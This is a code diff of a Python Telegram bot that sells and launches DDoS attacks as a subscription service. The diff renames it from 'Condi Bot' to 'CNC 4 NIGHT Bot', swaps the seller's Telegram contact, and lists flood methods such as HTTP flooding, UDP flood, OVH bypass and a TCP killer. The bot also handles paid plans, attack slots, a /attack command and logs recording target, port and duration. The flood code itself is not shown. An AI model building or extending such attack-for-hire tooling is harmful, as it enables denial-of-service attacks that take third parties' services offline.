@@ -48,7 +48,7 @@ def is_user_authorized(user_id):
     if info['expiry_date'] < datetime.datetime.now():
         del authorized_users[user_id]
         write_authorized_users(authorized_users)
-        bot.sendMessage(user_id, 'Your plan has expired. Contact @zxcr9999 to renew.')
+        bot.sendMessage(user_id, 'Your plan has expired. Contact @tcpsynn to renew.')
         return False
     return True
 
@@ -85,7 +85,7 @@ def handle_message(msg):
         last_attack_time = None
 
     if not is_user_authorized(user_id):
-        bot.sendMessage(chat_id, 'You dont have plan. Contact @zxcr9999 for buying plan.')
+        bot.sendMessage(chat_id, 'You dont have plan. Contact @tcpsynn for buying plan.')
         return
 
     if user_id not in admin_users:
@@ -98,14 +98,14 @@ def handle_message(msg):
         if text == '/help':
             bot.sendMessage(chat_id, 'User commands:\n/methods - Show attack methods.\n/attack - Sent attack.\n/running - Show running attacks..\n/info - Show bot information.\n/serverstatus - Show bot server status.\n/lookup - Lookup IP Address.\n\nAdmin commands:\n/adduser - Add new user.\n/removeuser - Remove user.\n/updateuser - Update user information.\n/userlist - Show all users information.\n/notification - Send message to all users.')
         elif text == '/methods':
-            bot.sendMessage(chat_id, 'List methods:\n- tls-destroy: I dont know lol\n- handshake: TCP handshake flood')
+            bot.sendMessage(chat_id, 'List Methods Layer7:\n- browser: ( BROWSER FAKE BYPASS )\n- http: ( HTTP FLOODER - ONLY FOR HTTP WEB )\nLIST METHODS LAYER4\n- udp: ( UDP FLOOD Optimized For Bypass )\n- ovh: ( OVH optimized For Bypass )\n- game: ( Game Flood Payload Max And Bypass )\n- tcp: ( Tcp Killer Max Payload )')
         elif text == '/info':
-            bot.sendMessage(chat_id, 'Condi Bot:\n\nOwner: @zxcr9999\nVersion: 1.2\nMax slots attack: 2\nIf you want to buy source. Contact @zxcr9999.')
+            bot.sendMessage(chat_id, 'CNC 4 NIGHT Bot:\n\nOwner: @tcpsynn\nVersion: 1.2\nMax slots attack: 2\nIf you want to buy plan. Contact @tcpsynn.')
         elif text == '/running':
             handle_running_command(chat_id)
         elif text.startswith('/attack'):
             if not is_user_authorized(user_id):
-                bot.sendMessage(chat_id, 'You dont have plan. Contact @zxcr9999 for buying plan.')
+                bot.sendMessage(chat_id, 'You dont have plan. Contact @tcpsynn for buying plan.')
                 return
 
             if attack_slots < 1:
@@ -148,15 +148,15 @@ def handle_message(msg):
             username = get_username(user_id)
             if username:
                 username = get_username(user_id) or f'Unknown user {user_id}'
-                message = f"Condi Attack Logs:\n==============================\nUsername: {username}\nTarget: {target}\nPort: {port}\nDuration: {duration}\nMethod: {method}\nDate: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nAttack slots: {attack_slots}/2"
+                message = f"CNC 4 NIGHT Attack Logs:\n==============================\nUsername: {username}\nTarget: {target}\nPort: {port}\nDuration: {duration}\nMethod: {method}\nDate: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nAttack slots: {attack_slots}/2"
 
             embed = {
-                'title': 'Condi Bot',
+                'title': 'CNC 4 NIGHT Bot',
                 'description': message,
                 'color': 15158332,
                 'footer': {
                     'icon_url': 'https://i.imgur.com/FywBjcj',
-                    'text': 'Condi Bot'
+                    'text': 'CNC 4 NIGHT Bot'
                 },
                 'thumbnail': {
                     'url': 'https://i.imgur.com/VJmeyAU'
@@ -269,7 +269,7 @@ def check_expired_users():
         if expiry_date < now:
             del authorized_users[user_id]
             write_authorized_users(authorized_users)
-            bot.sendMessage(user_id, 'Your plan has expired. Contact @zxcr9999 to renew.')
+            bot.sendMessage(user_id, 'Your plan has expired. Contact @tcpsynn to renew.')
     threading.Timer(86400, check_expired_users).start()
 
 def increase_attack_slots():
